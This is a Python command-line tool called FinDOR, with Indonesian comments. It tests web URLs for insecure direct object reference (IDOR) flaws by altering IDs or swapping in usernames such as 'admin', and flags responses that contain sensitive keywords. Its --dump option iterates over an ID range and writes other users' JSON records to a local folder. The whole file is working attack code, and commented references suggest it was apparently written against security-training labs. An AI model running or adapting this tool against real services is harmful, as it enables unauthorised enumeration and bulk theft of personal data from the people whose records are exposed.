import requests
import re
import argparse
import json
import os
import sys
import pyfiglet
from colorama import Fore

def extract_id_from_url(url):
    # Mengekstrak ID dari URL
    match = re.search(r'(?:[?&]|/)([a-zA-Z]+)?[a-zA-Z_]*[id|ID|name|NAME|nama|NAMA|user|USER]=(\w+)|/(\d+)(?:\.\w+)?/?$', url)
    if match:
        succeed = match.group(2) or match.group(3) or match.group(4) or 0
        return succeed
    else:
        match = re.search(r'/(\d+)', url)
        if match:
            succeed = match.group(1)
            return succeed
        else:
            match = re.search(r'[?&/](?:[a-zA-Z_]*[a-zA-Z])(?:=|/)([a-zA-Z0-9_]+)', url) 
            if match:
                succeed = match.group(1)
                return succeed
            else:
                return None
            
def check_if_integer(url):
    extracted_id = extract_id_from_url(url)

    try:
        int_value = int(extracted_id)
        # print(f"Bisa diubah menjadi integer. Nilai: {int_value}")
        return True
    except (ValueError, TypeError):
        # print("Tidak bisa diubah menjadi integer.")
        return False

def create_response_filename(base_filename):
    index = 1
    while True:
        filename = f"{base_filename}_{index}.txt"
        if not os.path.exists(filename):
            return filename
        index += 1
 

def dumper(url, idMin, idMax, headers=None, cookies=None):

    response = requests.get(url, headers=headers, cookies=cookies)

    if sys.platform.startswith('win'):
        output_folder = os.path.join(os.getenv('USERPROFILE'), 'Documents', 'FINDORResponses')
    elif sys.platform.startswith('linux'):
        output_folder = os.path.join(os.path.expanduser('~'), 'Documents', 'FINDORResponses')
    elif sys.platform.startswith('darwin'):  # MacOS
        output_folder = os.path.join(os.path.expanduser('~'), 'Documents', 'FINDORResponses')
    else:
        print("[" + Fore.RED + "ERR" + Fore.RESET + "]" + "Unsupported operating system!")
        return

    # os_user = os.getenv('USERNAME')
    # output_folder = f"C:/Users/{os_user}/Documents/FINDORResponses"
    base_filename = os.path.join(output_folder, 'response')

    if response.status_code == 200:
        # Pastikan folder output ada, jika tidak, buat folder baru
        if not os.path.exists(output_folder):
            os.makedirs(output_folder)

        # data = response.json()

        extracted_id = extract_id_from_url(url)
        check_int = check_if_integer(url)

        if check_int:
            int_id = int(extracted_id)

        filename = create_response_filename(base_filename)
        for i in range (idMin, idMax+1):
            request_dump = re.sub(rf'{int_id}\b', f'{i}', url)
            # print(f"{request_dump}")
            dump_data = requests.get(request_dump, headers=headers, cookies=cookies)
            json_data = dump_data.json()

            # filename = create_response_filename(base_filename)
            with open(os.path.join(output_folder, filename), 'a') as file:
                # Tulis data JSON ke dalam file
                file.write('\n\n')
                file.write(f"ID: {i} Datas: ")
                file.write('\n\n')
                json.dump(json_data, file)
                # Tulis newline untuk pemisah antara setiap respons
                file.write('\n\n')
        
            print("[" + Fore.BLUE + "*" + Fore.RESET + "]" + f" {i}'s data response successfully retrieved and written to file.")
        print("[" + Fore.CYAN + "INFO" + Fore.RESET + "]" + f" Please check the dumped data in the following path: '{output_folder}{filename}'")
    else:
        print("[" + Fore.RED + "ERR" + Fore.RESET + "]" + " Failed to retrieve response.")

def check_json_response(request_modified, headers=None, cookies=None):
    
    try:
        response = requests.get(request_modified, headers=headers, cookies=cookies)
        response.raise_for_status() # Raise an exception for bad status (4xx or 5xx)
        json_data = response.json()
        return True
    except requests.exceptions.RequestException as err:
        print("[" + Fore.YELLOW + "ERR" + Fore.RESET + "]" + f' Error accessing {request_modified}, Response: {err}')
        return False
    except json.JSONDecodeError as err:
        print("[" + Fore.YELLOW + "ERR" + Fore.RESET + "]" + f' Error decoding json from {request_modified}' + Fore.RESET)
        return False        

def check_idor_vulnerability_specifiedID(url, bearer_token=None, session_cookie=None, idMin=None, idMax=None, specified_id=None):

     # Add Bearer
    headers = {}
    if bearer_token:
        headers['Authorization'] = f'Bearer {bearer_token}'

    # Menyiapkan cookies
    cookies = {'session': session_cookie} if session_cookie else None

     # Menambahkan User-Agent
    headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'

    # # Menambahkan Origin
    # headers['Origin'] = 'https://0a5c0057033a7cbc825c15830013007a.web-security-academy.net'

    # check_json = check_json_response(url, headers=headers, cookies=cookies)

    # if (idMin and idMax is not None) and (check_json is True):
    #     dumper(url, idMin, idMax, headers=headers, cookies=cookies)
    #     return
    # State 1: Cek apakah ada parameter ID yang berupa deretan angka bilangan bulat

    if specified_id not in url:
        print("[" + Fore.GREEN + "WARN" + Fore.RESET + "]" + " The specified_id is not available in the url. Please make sure that the specified_id is available in the url given!")
        return

    extracted_id = specified_id
    if not extracted_id:
        print("[" + Fore.GREEN + "ERR" + Fore.RESET + "]" + " Parameter is not vulnerable!")
        print(f'{extracted_id}')
        return
    
    # State 2: Cek apakah ID merupakan integer atau string dan cek apakah jika parameter ID diubah aplikasi akan merespons dengan 200 OK
    check_int = check_if_integer(url)
    # int_id = None
    COUNTMIN = 0
    COUNTMAX = 0
    if check_int:
        int_id = int(extracted_id)
        countmin_int_id = int_id
        countmax_int_id = int_id
        response_original = requests.get(url, headers=headers, cookies=cookies)
        request_modified = re.sub(rf'{int_id}\b', f'{int_id-1}', url)
        response_modified = requests.get(request_modified, headers=headers, cookies=cookies)
        
        if(response_modified.status_code != 200 and COUNTMIN <= 10):
            # print(f'{COUNTMIN}')
            for i in range(1,12):
                COUNTMIN+=1
                request_modified = re.sub(rf'{int_id}\b', f'{countmin_int_id-i}', url)
                response_modified = requests.get(request_modified, headers=headers, cookies=cookies)
                if(response_modified.status_code == 200 and COUNTMIN <= 10):
                    break      
            if(response_modified.status_code != 200 and COUNTMIN > 10 and COUNTMAX <=20):
            # print(f'{COUNTMIN}')
                for j in range(1,21):
                    COUNTMAX+=1
                    request_modified = re.sub(rf'{int_id}\b', f'{countmax_int_id+j}', url)
                    response_modified = requests.get(request_modified, headers=headers, cookies=cookies)
                    if(response_modified.status_code == 200 and COUNTMAX <=20):
                        break

    else:
        str_id = extracted_id
        response_original = requests.get(url, headers=headers, cookies=cookies)
        # response_modified = re.sub(rf'{str_id}\b', 'admin', url)
        # response_modified = requests.get(response_modified, headers=headers, cookies=cookies)
        cases_to_try = ['carlos', 'admin', 'Admin', 'ADMIN', 'Administrator', 'administrator', 'ADMINISTRATOR'] # Bisa ditambahkan daftar known username yang ada
        for case in cases_to_try:
            request_modified = re.sub(rf'{str_id}\b', case, url)
            # url_modified_test = re.sub(rf'{str_id}\b', case, url)
            response_modified = requests.get(request_modified, headers=headers, cookies=cookies)
            
            # Jika berhasil ganti casing, keluar dari loop
            # if len(response_modified.content) != len(response_original.content) and response_modified.status_code == 200:
            if response_modified.content != response_original.content and response_modified.status_code == 200:
                # print(f'{url_modified_test}')
                break

    # State 2: Cek apakah jika parameter ID diubah aplikasi akan merespons dengan 200 OK
    check_json = check_json_response(request_modified, headers=headers, cookies=cookies)


    if response_modified.status_code != 200:
        print("[" + Fore.GREEN + "ERR" + Fore.RESET + "]" + f"Parameter not Vulnerable to IDOR, response: {response_modified.status_code}")
        # print(f'{response_modified}')
        if response_modified.status_code == 401:
            print("[" + Fore.CYAN + "INFO" + Fore.RESET + "]" + ' Please add --bearer-token or --cookie to authenticate the requests.')
        elif response_modified.status_code == 504:
            print("[" + Fore.CYAN + "INFO" + Fore.RESET + "]" + ' It is better to use --id to specify the id in the URL.')
        elif response_modified.status_code == 404:
            print("[" + Fore.CYAN + "INFO" + Fore.RESET + "]" + ' Please make sure that the given URL is correct.')
        return

    # State 3: Cek apakah content-length dari response yang sudah diubah berbeda dengan ID yang sebelum diubah
    if len(response_original.content) == len(response_modified.content) and response_original.content == response_modified.content:
        print("[" + Fore.YELLOW + "WARN" + Fore.RESET + "]" + " Parameter might be vulnerable, try validate it manually!")
        return
    
    # print(f"{response_original.content}\n\n")
    # print(f"{response_modified.content}\n\n")
    success = None

    # State 4: Cek apakah pada response mengandung data seperti nama, ID, email, nomor telepon, dll
    sensitive_data = ['nama', 'ID', 'email', 'id', 'Id', 'nomor telepon','password', 'phone','name','invoice','price','mobile','Key','key','Secret','secret','role','Role','status','Status','address','Address', 'location', 'Location']
    if any(keyword in response_modified.text for keyword in sensitive_data) and check_json==True:
        print("[" + Fore.RED + "CRITICAL" + Fore.RESET + "]" + " Given paramater is valid vulnerable to IDOR.")
        success = True
        if (idMin is None and idMax is None) and (success is True):
            print("[" + Fore.CYAN + "INFO" + Fore.RESET + "]" + " You can add --dump=[RANGE_ID] to dump the datas.")
        # print(response_modified.text)
        # print(f'{extracted_id}')
        # print(response_modified.text)
    elif any(keyword in response_modified.text for keyword in sensitive_data) and check_json==False:
        print("[" + Fore.YELLOW + "WARN" + Fore.RESET + "]" + " Given paramater is vulnerable to IDOR, however because respon not in jSON format, Therefore there is indication sensitive information that appears. Hopefully we recommend to validate it manually!.")
        # print(response_modified.text)
    else:
        print("[" + Fore.YELLOW + "WARN" + Fore.RESET + "]" + " There is a false-positive vulnerability to IDOR because it does not contain sensitive data, please check it manually!")
    # Jika semua state terlewati, keluarkan output bahwa aplikasi valid rentan terhadap IDOR
    # print("Aplikasi valid rentan terhadap IDOR")

    # print('Ini menggunakan specified ID!')

    if (idMin is not None and idMax is not None) and (check_json is True):
        dumper(url, idMin, idMax, headers=headers, cookies=cookies)
        return

def check_idor_vulnerability(url, bearer_token=None, session_cookie=None, idMin=None, idMax=None):

     # Add Bearer
    headers = {}
    if bearer_token:
        headers['Authorization'] = f'Bearer {bearer_token}'

    # Menyiapkan cookies
    cookies = {'session': session_cookie} if session_cookie else None

     # Menambahkan User-Agent
    headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'

    # # Menambahkan Origin
    # headers['Origin'] = 'https://0a5c0057033a7cbc825c15830013007a.web-security-academy.net'

    # check_json = check_json_response(url, headers=headers, cookies=cookies)

    # if (idMin and idMax is not None) and (check_json is True):
    #     dumper(url, idMin, idMax, headers=headers, cookies=cookies)
    #     return
    # State 1: Cek apakah ada parameter ID yang berupa deretan angka bilangan bulat
    extracted_id = extract_id_from_url(url)
    if not extracted_id:
        print("[" + Fore.GREEN + "ERR" + Fore.RESET + "]" + " Parameter is not vulnerable!")
        print(f'{extracted_id}')
        return
    
    # State 2: Cek apakah ID merupakan integer atau string dan cek apakah jika parameter ID diubah aplikasi akan merespons dengan 200 OK
    check_int = check_if_integer(url)
    # int_id = None
    COUNTMIN = 0
    COUNTMAX = 0
    if check_int:
        int_id = int(extracted_id)
        countmin_int_id = int_id
        countmax_int_id = int_id
        response_original = requests.get(url, headers=headers, cookies=cookies)
        request_modified = re.sub(rf'{int_id}\b', f'{int_id-1}', url)
        response_modified = requests.get(request_modified, headers=headers, cookies=cookies)
        
        if(response_modified.status_code != 200 and COUNTMIN <= 10):
            # print(f'{COUNTMIN}')
            for i in range(1,12):
                COUNTMIN+=1
                request_modified = re.sub(rf'{int_id}\b', f'{countmin_int_id-i}', url)
                response_modified = requests.get(request_modified, headers=headers, cookies=cookies)
                if(response_modified.status_code == 200 and COUNTMIN <= 10):
                    break      
            if(response_modified.status_code != 200 and COUNTMIN > 10 and COUNTMAX <=20):
            # print(f'{COUNTMIN}')
                for j in range(1,21):
                    COUNTMAX+=1
                    request_modified = re.sub(rf'{int_id}\b', f'{countmax_int_id+j}', url)
                    response_modified = requests.get(request_modified, headers=headers, cookies=cookies)
                    if(response_modified.status_code == 200 and COUNTMAX <=20):
                        break

    else:
        str_id = extracted_id
        response_original = requests.get(url, headers=headers, cookies=cookies)
        # response_modified = re.sub(rf'{str_id}\b', 'admin', url)
        # response_modified = requests.get(response_modified, headers=headers, cookies=cookies)
        cases_to_try = ['carlos', 'admin', 'Admin', 'ADMIN', 'Administrator', 'administrator', 'ADMINISTRATOR'] # Bisa ditambahkan daftar known username yang ada
        for case in cases_to_try:
            request_modified = re.sub(rf'{str_id}\b', case, url)
            # url_modified_test = re.sub(rf'{str_id}\b', case, url)
            response_modified = requests.get(request_modified, headers=headers, cookies=cookies)
            
            # Jika berhasil ganti casing, keluar dari loop
            # if len(response_modified.content) != len(response_original.content) and response_modified.status_code == 200:
            if response_modified.content != response_original.content and response_modified.status_code == 200:
                # print(f'{url_modified_test}')
                break

    # State 2: Cek apakah jika parameter ID diubah aplikasi akan merespons dengan 200 OK
    check_json = check_json_response(request_modified, headers=headers, cookies=cookies)


    if response_modified.status_code != 200:
        print("[" + Fore.GREEN + "ERR" + Fore.RESET + "]" + f" Given paramater is not vulnerable, response: {response_modified.status_code}")
        # print(f'{response_modified}')
        if response_modified.status_code == 401:
            print("[" + Fore.CYAN + "INFO" + Fore.RESET + "]" + ' Please add --bearer-token or --cookie to authenticate the requests.')
        elif response_modified.status_code == 504:
            print("[" + Fore.CYAN + "INFO" + Fore.RESET + "]" + ' It is better to use --id to specify the id in the URL.')
        elif response_modified.status_code == 404:
            print("[" + Fore.CYAN + "INFO" + Fore.RESET + "]" + ' Please make sure that the given URL is correct.')
        return

    # State 3: Cek apakah content-length dari response yang sudah diubah berbeda dengan ID yang sebelum diubah
    if len(response_original.content) == len(response_modified.content) and response_original.content == response_modified.content:
        print("[" + Fore.YELLOW + "WARN" + Fore.RESET + "]" + " Parameter might be vulnerable, try validate it manually!")
        return
    
    # print(f"{response_original.content}\n\n")
    # print(f"{response_modified.content}\n\n")
    success = None

    # State 4: Cek apakah pada response mengandung data seperti nama, ID, email, nomor telepon, dll
    sensitive_data = ['nama', 'ID', 'email', 'id', 'Id', 'nomor telepon','password', 'phone','name','invoice','price','mobile','Key','key','Secret','secret','role','Role','status','Status','address','Address', 'location', 'Location']
    if any(keyword in response_modified.text for keyword in sensitive_data) and check_json==True:
        print("[" + Fore.RED + "CRITICAL" + Fore.RESET + "]" + " Given paramater is valid vulnerable to IDOR.")
        success = True
        if (idMin is None and idMax is None) and (success is True):
            print("[" + Fore.CYAN + "INFO" + Fore.RESET + "]" + " You can add --dump=[RANGE_ID] to dump the datas.")
        # print(response_modified.text)
        # print(f'{extracted_id}')
        # print(response_modified.text)
    elif any(keyword in response_modified.text for keyword in sensitive_data) and check_json==False:
        print("[" + Fore.YELLOW + "WARN" + Fore.RESET + "]" + " Given paramater is vulnerable to IDOR, however because respon not in jSON format, Therefore there is indication sensitive information that appears. Hopefully we recommend to validate it manually!")
        # print(response_modified.text)
    else:
        print("[" + Fore.YELLOW + "WARN" + Fore.RESET + "]" + " There is a false-positive vulnerability to IDOR because it does not contain sensitive data, please check it manually!")
    # Jika semua state terlewati, keluarkan output bahwa aplikasi valid rentan terhadap IDOR
    # print("Aplikasi valid rentan terhadap IDOR")
        
    if (idMin is not None and idMax is not None) and (check_json is True):
        dumper(url, idMin, idMax, headers=headers, cookies=cookies)
        return
    
def printLogo():
    logo = pyfiglet.figlet_format("FinDOR", font="slant")
    print( Fore.CYAN + logo + Fore.RESET)
    print(Fore.CYAN + "\t"+ "by @adigunahirzi" + Fore.RESET)
    print("")

def main():

    printLogo()
    parser = argparse.ArgumentParser(description='FinDOR HelpGuide: ')

    # Menambahkan opsi dengan store_true
    parser.add_argument('-u', '--url', dest="url", help='Input URL parameter to be tested')
    parser.add_argument('-b', '--bearer-token', dest="bearer_token", help='Input Bearer Token')
    parser.add_argument('-c', '--cookie', dest="session_cookie", help='Input Cookie')
    parser.add_argument('-d', '--dump', dest='dump', help="Feature to dump data if the response is json Specify the range as idMin-idMax")
    parser.add_argument('-i', '--id', dest="specified_id", help="Input specified ID")

    # Parse argumen dari baris perintah
    args = parser.parse_args()

    idMin, idMax = None, None

    if args.dump:
        idMin, idMax = map(int, args.dump.split('-'))

    if(args.specified_id):
        check_idor_vulnerability_specifiedID(args.url,args.bearer_token,args.session_cookie, idMin, idMax, args.specified_id)
    else:
        check_idor_vulnerability(args.url,args.bearer_token,args.session_cookie, idMin, idMax)


if __name__ == "__main__":
    main()
